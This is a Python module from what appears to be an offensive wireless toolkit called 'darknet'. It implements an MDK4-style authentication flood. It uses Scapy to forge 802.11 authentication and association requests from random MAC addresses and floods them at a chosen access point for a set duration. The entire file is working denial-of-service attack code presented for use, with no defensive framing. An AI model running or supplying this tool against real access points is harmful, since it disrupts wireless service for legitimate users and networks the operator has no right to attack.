"""
Authentication flood attack module (MDK4-style)
Floods AP with authentication requests
"""

from scapy.all import *
from darknet.core.base import AttackModule
from darknet.utils.constants import *
import time
import random


class AuthFloodAttack(AttackModule):
    """
    Authentication flood attack
    Overwhelms AP with authentication requests (MDK4 auth-dos mode)
    """

    def __init__(self):
        super().__init__(
            name="Auth Flood",
            description="Flood AP with authentication requests (MDK4-style)",
            attack_type=ATTACK_AUTH_FLOOD
        )
        self.ap_mac = None
        self.ap_ssid = None
        self.channel = None
        self.rate = INJECTION_RATE_AGGRESSIVE
        self.duration = 60

    def setup(self, **kwargs) -> bool:
        """
        Setup auth flood attack
        Args:
            interface: Wireless interface
            ap_mac: Target AP MAC
            ap_ssid: Target AP SSID
            channel: Target channel
            rate: Packets per second
            duration: Attack duration in seconds
        """
        try:
            self.interface = kwargs.get('interface')
            self.ap_mac = kwargs.get('ap_mac')
            self.ap_ssid = kwargs.get('ap_ssid')
            self.channel = kwargs.get('channel')
            self.rate = kwargs.get('rate', INJECTION_RATE_AGGRESSIVE)
            self.duration = kwargs.get('duration', 60)

            if not self.interface or not self.ap_mac:
                self.logger.error("Interface and AP MAC required")
                return False

            self.logger.info(f"Auth flood configured:")
            self.logger.info(f"  Target AP: {self.ap_mac}")
            self.logger.info(f"  Rate: {self.rate} pps")
            self.logger.info(f"  Duration: {self.duration}s")

            return True

        except Exception as e:
            self.logger.error(f"Setup failed: {e}")
            return False

    def _create_auth_request(self, client_mac: str) -> Packet:
        """Create authentication request packet"""
        dot11 = Dot11(
            type=0,
            subtype=11,  # Authentication
            addr1=self.ap_mac,
            addr2=client_mac,
            addr3=self.ap_mac
        )

        # Authentication frame
        # Algorithm: Open System (0)
        # Sequence: 1
        # Status: Successful (0)
        auth = Dot11Auth(algo=0, seqnum=1, status=0)

        pkt = RadioTap() / dot11 / auth

        return pkt

    def _create_assoc_request(self, client_mac: str) -> Packet:
        """Create association request packet"""
        dot11 = Dot11(
            type=0,
            subtype=0,
            addr1=self.ap_mac,
            addr2=client_mac,
            addr3=self.ap_mac
        )

        capability = 0x1104
        assoc_req = Dot11AssoReq(cap=capability, listen_interval=5)

        essid = Dot11Elt(ID='SSID', info=self.ap_ssid or '', len=len(self.ap_ssid or ''))
        rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')

        pkt = RadioTap() / dot11 / assoc_req / essid / rates

        return pkt

    def run(self) -> dict:
        """Execute auth flood attack"""
        try:
            self.logger.attack(f"Starting authentication flood on {self.ap_mac}")

            # Set channel
            if self.channel:
                subprocess.run(
                    ['iw', 'dev', self.interface, 'set', 'channel', str(self.channel)],
                    check=True,
                    capture_output=True
                )

            inter = 1.0 / self.rate if self.rate > 0 else 0
            start_time = time.time()

            while not self._stop_event.is_set():
                # Generate random client MAC
                client_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(6))

                # Send auth request
                auth_pkt = self._create_auth_request(client_mac)
                sendp(auth_pkt, iface=self.interface, verbose=False)
                self.packets_sent += 1

                # Also send association request
                assoc_pkt = self._create_assoc_request(client_mac)
                sendp(assoc_pkt, iface=self.interface, verbose=False)
                self.packets_sent += 1

                # Check duration
                if time.time() - start_time > self.duration:
                    break

                if self.packets_sent % 1000 == 0:
                    self.logger.info(f"Sent {self.packets_sent} auth/assoc packets")

                if inter > 0:
                    time.sleep(inter)

            self.logger.success(f"Auth flood completed: {self.packets_sent} packets sent")

            return {
                'success': True,
                'packets_sent': self.packets_sent,
                'target_ap': self.ap_mac
            }

        except Exception as e:
            self.logger.error(f"Attack failed: {e}")
            return {'success': False, 'error': str(e)}

    def stop(self):
        """Stop the attack"""
        self._stop_event.set()

    def cleanup(self):
        """Cleanup resources"""
        pass
